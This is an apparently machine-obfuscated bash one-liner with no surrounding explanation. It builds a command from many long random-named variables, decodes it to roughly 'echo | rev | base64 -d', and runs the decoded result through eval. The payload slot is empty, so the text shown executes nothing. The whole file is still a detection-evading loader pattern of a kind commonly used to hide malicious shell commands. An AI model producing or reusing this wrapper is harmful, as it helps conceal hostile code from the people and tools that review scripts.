nsVdoICUcDCneQfbSolICDcZqfcVViUCfLwufrLZmPIFIlwYAOlBjwkzePxWqvCHJJkLCplHXhHLvpxrhabmlEwXJvXnFKXyEqhn="NLpronKYSukKgBsWDKseFAjYebDQVCfgnsdJMZAcymrzdJOJffgXnHfFPsJUtpqJDoHWaGUhrAvYTSKmnkfLeuyPKlgcloynJugG";GsVNrDuspJJzgQWhdwThegFSRkAxHRngDkIEVguIUydJmnfuRDbqhvHKtARYndBCWkAgAFHKintSfIHcnnEiogvntuSUMhnNShCX="tkequTwRJMNcmWYVOtNhCPdFiBiSWsNCCopwwBlkwvBRmikBnDmFFlOKklDnVizJcHoWeQwtCPBLYuhFbasxNjeDQXjlqooeubfa";TzNsDEJAugKAYJLvziPNZckLZHMrcymJPpSMyQOXdmTRtmiDdIqZQgMuGFNKhLuizpcBFrdpPisRYhXTkJTfgoDWgOScVwkWnyJI="ch";lCYAVXawifSnfdjvNwjgazsKUMXdyCKXVIMsfYVUJrdEsPigLSQBBfpsXuTSfNKirjcijjEElANAHdajZYjFyYMuNkYTCEsyzTPR="4";KwvWaMbRrtyAUjaxPeRdzqbGeVANCkuZIBoRlmrNPmzjEItymXjnqFJjgJRYPctNOVCfpSAppOchwfNQMcEyaNkQJlxSPoaOdTzW="";feEhWTOTWWVZKoFOiNAcfKMvEjKFmwEjtShAEbmxyCrsBJaWHMZQSstNSEEqlfSyxtVoOIBiTmNKefdBsxSnCFgoCRngDluGPnbn="PALXNamTGpFUOSRgYJPFEyITtNvaxoXVKUjGRkcywGOYZWGNuezUeCiUKExkRqsGzetCwWGOMoBLvEbyrAPdVpgxyxzdZXRxZCwo";gdtTxOrXQrourhvlHKXoEtUSIKJoqadJvAhlSCjrkFAcsGWqZrxrRyNKemzJHIGKEsqKXOJpIvSTkXwNLxdfMBkrqOlKjzMVsWLx="  | r";fHqGvwngMcgRiShWLNDoSgGrYCHOTQgRDHCKNELLpEniuwPXwrTzEjqabrvoZEYEgHPobQHORmzoAkFcSxLgZsjMHCrcMspJxekN="PdOetthYuQbplFFRLsTQpNBEjzIVVPZUYOCNazASjHNPBoQVzjVBUFNbVgIJzdMqTlnXvHWmOkgYmkPSNtIFeGuAqUhWHypvgkSS";fCcfUuqKrZigwHPtIXIetMbabBsoSpaqCjKYezjbnZIczFVFjvokynGgvRkmzbzAJdvmmCxDvCFDyrBkXkYyvtHFgHmcIhiaCSgQ="";UCBxfjaIcrMJlpjAVLNgwjpMbkthImAuhXdATgLrFcjSilZCQWavmfieYKPCujSStLDRAErAxjtTFJFbwvojpRIlArhveDuaAhwI="as";YLJKhJljgpHuWEGjkmwqVEaHJGvQvqHDTAmIQRiOzopJppyNwZWiyqyoogFZpafsIFRheguQevhJWpgdgzTAkJmGWOqklgWsdCzy="IbpmKPSutIVcdQMmtBjZdNpnShbqXTjEcNVjhliJaeZeaDfZyYztxFnqGlFgnbzRiHnsUSiKMcIhxkpEvOVWyEbwzkLOOWQNjmdB";uMdrEBGgPbUqekobxrphbiEMXWDNrPnLKAbWfBrmYVZDiImRqeMcgfwthYqQmDpMkJyUFbCjvFgyRvXFuqCWJOgbgkhMotsOnDLE="kdzUGsBVKGmYujEfIuoVkPpzHurGPQSkXzkyAfUyZNqwEVTxZRtcHQdXZUwmNlYwRXzHyePjbiszTxiNodcgefIUzOkRGUHonvUZ";efFXwuKoGXOlvEAjGSVftYVuZyrUvrYVRBaUXwwSptqnOjjRxKFgFVrlRDYDZlxaCYcAUArnWoPzQEBndZcVSYKfFQxdvUVkxwrI="o";oSrwCCyOQcICaspuSRhzFdHCPyIEuoIXZTkPbQhiIoBrhUIOhKqxXFnGeypBkZtSjObXkJDmDJzVSdKtSmUJJknRVXRekdbjRtWV="6";meGeVXxJLGutSjPEfowbeiuIPFYILYDdtbrUTaOfDusPayLinSbmjMKsDHUdrkLYyrgEwrabaFkFtHnXsaXaqCeyoKEaNrEwQxAr="PyrRqXFGSZBNVvGsHGOnqsDaYxNwLKHhbyboOvgMKDoDMluBhccTYtZKQrjkmWYTHfKwCPVyqwQysrtnqEOpcwcfAcbAOHDJiLWn";mZMKTrVllVNLUtiBTFWZiwTCzpfwBHKrYkiNbEJzmcHUuafXkNvIIblbyAzulXMwxnRouEVUOXbBfhGrFNiTNorqHwmHdfDDXycw=" -d";VILnGDUludIWKmwGGzeKludZCBxNiiywskukhrquATddubPntGfmwQkmickkGnEbZzwrfvJAwQlQqKWIEswiBNwSekpECWKJYBXg="bLHBbItxWNApOJHLAAQKWeomUOiSPspwhaIbvqgVSrlrvBnjwaDEiMpNfkRMHWLircarDmcjOqvPtHMnteCVbXIEGYApkMCXWrRg";udrEJyNlkqugkpacpEgQHZwuFKtZkSnnFQvVGbQLoAMHECayOzeuskHvTfHpLEYCIGDimynGMpylbMlTzkqGcrkeyePScZcXmwNx="";vxsXDljASKmdLWLVqeBakDmenbEfvTOuMNgXHZhPLOJVChQLakfNUQMVDGcUnhQghuWHTlWRYdtiXQWwWQVrHIhLxBqTUcJEUpgW="b";BNiFKyzDwsNXPZyFnPLaPucDmxVQnethzdPEPvYjMxjrRBQyBedKSYzSalsdubznLPRccOHDiFtpNDzTpxowyJOwpxLQHQLITNZZ="e";YlnutxFpTtYMpkuWwYlNQGTXEqgIcXjfJdJZtBuoNzAGHeeTAjtcKicqqAILZcsOlGHMahIQfRqliOPMxCCEYVsFFBAnjzOcyXpS="v |";Tx=Eds;mzpPGdmoVqsxvJryFRboKomZpbfGRdyIoqSPJTAHzLaGiuIPWidWdfpkXaOEcHLiAjbkjmUlFDDkCneooqamuLYTVIlgBAMjtGrJ="";sXIrUWFXSASfkqKSHUfWSctSbRxQtRHIAlGUbJJNUYxDWvpewYiRhHQLGVgtPHaHIYSAXEPLDXgETMckBtWQJxpbzkeVUzwqGrQj=$(eval "$fCcfUuqKrZigwHPtIXIetMbabBsoSpaqCjKYezjbnZIczFVFjvokynGgvRkmzbzAJdvmmCxDvCFDyrBkXkYyvtHFgHmcIhiaCSgQ$BNiFKyzDwsNXPZyFnPLaPucDmxVQnethzdPEPvYjMxjrRBQyBedKSYzSalsdubznLPRccOHDiFtpNDzTpxowyJOwpxLQHQLITNZZ$TzNsDEJAugKAYJLvziPNZckLZHMrcymJPpSMyQOXdmTRtmiDdIqZQgMuGFNKhLuizpcBFrdpPisRYhXTkJTfgoDWgOScVwkWnyJI$KwvWaMbRrtyAUjaxPeRdzqbGeVANCkuZIBoRlmrNPmzjEItymXjnqFJjgJRYPctNOVCfpSAppOchwfNQMcEyaNkQJlxSPoaOdTzW$efFXwuKoGXOlvEAjGSVftYVuZyrUvrYVRBaUXwwSptqnOjjRxKFgFVrlRDYDZlxaCYcAUArnWoPzQEBndZcVSYKfFQxdvUVkxwrI$gdtTxOrXQrourhvlHKXoEtUSIKJoqadJvAhlSCjrkFAcsGWqZrxrRyNKemzJHIGKEsqKXOJpIvSTkXwNLxdfMBkrqOlKjzMVsWLx$BNiFKyzDwsNXPZyFnPLaPucDmxVQnethzdPEPvYjMxjrRBQyBedKSYzSalsdubznLPRccOHDiFtpNDzTpxowyJOwpxLQHQLITNZZ$YlnutxFpTtYMpkuWwYlNQGTXEqgIcXjfJdJZtBuoNzAGHeeTAjtcKicqqAILZcsOlGHMahIQfRqliOPMxCCEYVsFFBAnjzOcyXpS$fCcfUuqKrZigwHPtIXIetMbabBsoSpaqCjKYezjbnZIczFVFjvokynGgvRkmzbzAJdvmmCxDvCFDyrBkXkYyvtHFgHmcIhiaCSgQ$vxsXDljASKmdLWLVqeBakDmenbEfvTOuMNgXHZhPLOJVChQLakfNUQMVDGcUnhQghuWHTlWRYdtiXQWwWQVrHIhLxBqTUcJEUpgW$mzpPGdmoVqsxvJryFRboKomZpbfGRdyIoqSPJTAHzLaGiuIPWidWdfpkXaOEcHLiAjbkjmUlFDDkCneooqamuLYTVIlgBAMjtGrJ$UCBxfjaIcrMJlpjAVLNgwjpMbkthImAuhXdATgLrFcjSilZCQWavmfieYKPCujSStLDRAErAxjtTFJFbwvojpRIlArhveDuaAhwI$BNiFKyzDwsNXPZyFnPLaPucDmxVQnethzdPEPvYjMxjrRBQyBedKSYzSalsdubznLPRccOHDiFtpNDzTpxowyJOwpxLQHQLITNZZ$oSrwCCyOQcICaspuSRhzFdHCPyIEuoIXZTkPbQhiIoBrhUIOhKqxXFnGeypBkZtSjObXkJDmDJzVSdKtSmUJJknRVXRekdbjRtWV$KwvWaMbRrtyAUjaxPeRdzqbGeVANCkuZIBoRlmrNPmzjEItymXjnqFJjgJRYPctNOVCfpSAppOchwfNQMcEyaNkQJlxSPoaOdTzW$lCYAVXawifSnfdjvNwjgazsKUMXdyCKXVIMsfYVUJrdEsPigLSQBBfpsXuTSfNKirjcijjEElANAHdajZYjFyYMuNkYTCEsyzTPR$mZMKTrVllVNLUtiBTFWZiwTCzpfwBHKrYkiNbEJzmcHUuafXkNvIIblbyAzulXMwxnRouEVUOXbBfhGrFNiTNorqHwmHdfDDXycw$mzpPGdmoVqsxvJryFRboKomZpbfGRdyIoqSPJTAHzLaGiuIPWidWdfpkXaOEcHLiAjbkjmUlFDDkCneooqamuLYTVIlgBAMjtGrJ");eval "$udrEJyNlkqugkpacpEgQHZwuFKtZkSnnFQvVGbQLoAMHECayOzeuskHvTfHpLEYCIGDimynGMpylbMlTzkqGcrkeyePScZcXmwNx$sXIrUWFXSASfkqKSHUfWSctSbRxQtRHIAlGUbJJNUYxDWvpewYiRhHQLGVgtPHaHIYSAXEPLDXgETMckBtWQJxpbzkeVUzwqGrQj$fCcfUuqKrZigwHPtIXIetMbabBsoSpaqCjKYezjbnZIczFVFjvokynGgvRkmzbzAJdvmmCxDvCFDyrBkXkYyvtHFgHmcIhiaCSgQ$KwvWaMbRrtyAUjaxPeRdzqbGeVANCkuZIBoRlmrNPmzjEItymXjnqFJjgJRYPctNOVCfpSAppOchwfNQMcEyaNkQJlxSPoaOdTzW"